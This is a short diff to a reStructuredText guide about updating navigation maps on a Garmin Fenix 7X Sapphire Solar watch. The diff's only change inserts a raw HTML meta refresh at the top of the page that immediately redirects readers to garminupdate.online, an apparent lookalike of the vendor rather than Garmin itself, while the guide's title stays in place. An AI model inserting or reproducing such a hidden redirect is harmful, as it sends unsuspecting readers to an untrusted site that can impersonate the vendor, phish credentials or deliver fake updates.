@@ -1,3 +1,9 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
+
+
+
 Garmin Fenix 7X Sapphire Solar Map Update: How to Keep Your Navigation Maps Current
 =============================================================
 
